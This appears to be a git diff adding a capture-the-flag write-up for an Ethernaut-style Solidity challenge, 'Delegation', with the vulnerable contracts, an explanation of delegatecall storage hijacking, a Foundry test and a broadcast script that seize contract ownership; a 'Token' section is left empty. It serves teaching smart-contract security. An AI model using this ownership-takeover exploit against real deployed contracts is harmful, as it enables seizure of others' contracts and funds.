@@ -539,3 +539,165 @@ contract TelephoneTest is Test {
 ## 🧠 Takeaway
 
 Using `tx.origin` for authentication is highly discouraged. Always use `msg.sender` for access control.
+
+---
+---
+
+## 5. Token
+
+
+---
+---
+## 6. Delegation
+
+**Goal**: Become the owner of the `Delegation` contract.
+
+---
+### Challenge Overview
+
+You are given two contracts:
+
+### `Delegation.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+// Delegate Contract
+contract Delegate {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+// Delegation contract
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    constructor(address _delegateAddress) {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external {
+        (bool result,) = address(delegate).delegatecall(msg.data);
+        if (result) {
+            this;
+        }
+    }
+}
+```
+
+## Understanding the Vulnerability
+The Delegation contract uses a delegatecall inside its fallback function:
+```javascript
+(bool result,) = address(delegate).delegatecall(msg.data);
+```
+If any call is made to Delegation with arbitrary data, that call is forwarded to Delegate using delegatecall.
+
+The key here is:
+- delegatecall preserves msg.sender and context.
+- The pwn() function in Delegate sets owner = msg.sender.
+- Since this is called using delegatecall, it will set the storage of the Delegation contract (owner) to msg.sender.
+
+So, if we send a transaction to Delegation with msg.data = abi.encodeWithSignature("pwn()"), the fallback will delegatecall pwn() on the Delegate, which sets Delegation.owner = msg.sender.
+
+## Exploit Strategy
+1.	Send a low-level call to the Delegation contract with function signature pwn().
+2.	The fallback function catches it and uses delegatecall.
+3.	The pwn() function gets executed in the context of Delegation, changing its owner to us.
+
+## Foundry Test
+`test/Delegation.t.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import { Delegation, Delegate } from "../src/Delegation.sol";
+
+contract DelegationTest is Test {
+    
+    Delegation public delegation;
+    Delegate public delegate;
+    address public owner = makeAddr("owner");
+    address public attacker = makeAddr("Attacker");
+
+    function setUp() public {
+        delegate = new Delegate(owner);
+        delegation = new Delegation(address(delegate));
+    }
+
+    function test_Attack() public {
+        address initialOwner = delegation.owner();
+        console.log("Initial Owner: ", initialOwner);
+
+        vm.startPrank(attacker);
+        // Exploit via fallback -> delegatecall -> pwn()
+        (bool s, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
+        require(s, "S not successful");
+        vm.stopPrank();
+
+        address ownerAfter = delegation.owner();
+        console.log("Owner after attack:  ", ownerAfter);
+        assertEq(ownerAfter, attacker, "Attacker is not owner : YOU LOST");
+    }
+}
+```
+
+### TEST OUTPUT
+![Test Img](assets/delegation2.png)
+
+## Exploit Script
+`script/DelegationSolution.s.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import { Delegation, Delegate } from "../src/Delegation.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+contract DelegationSolution is Script {
+    Delegation public delegation = Delegation(0x4D354f2c6059Adf5ACCEDd00a58a94349dE13Ac8);
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        (bool s, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
+        require(s, "S not successful");
+
+        vm.stopBroadcast();
+    }
+}
+```
+
+### How to run:
+```bash
+forge script script/DelegationSolution.s.sol --rpc-url $RPC_URL --broadcast --verify
+```
+
+### Challenge Completed
+![Done Img](assets/delegation1.png)
+
+## Key Takeaways
+- delegatecall executes code in the context of the caller’s storage.
+- Fallback functions + delegatecall can be dangerous if arbitrary data is forwarded unchecked.
+- Even if pwn() is not in Delegation, it can be executed via Delegate using fallback + delegatecall.
+
+## Summary
+- delegatecall : Executes callee’s code in caller’s storage context
+- fallback() : Catches unknown functions and can be abused to route malicious calls
+- Exploit : Send function signature pwn() to trigger fallback, which runs delegatecall(pwn()) and changes owner
+
+## 📚 References | Resources
+
+- 🔗 [Understanding `delegatecall` (RareSkills)](https://www.rareskills.io/post/delegatecall)
+- 📘 [Cyfrin Glossary: `delegatecall` Solidity Example](https://www.cyfrin.io/glossary/delegatecall-solidity-code-example)
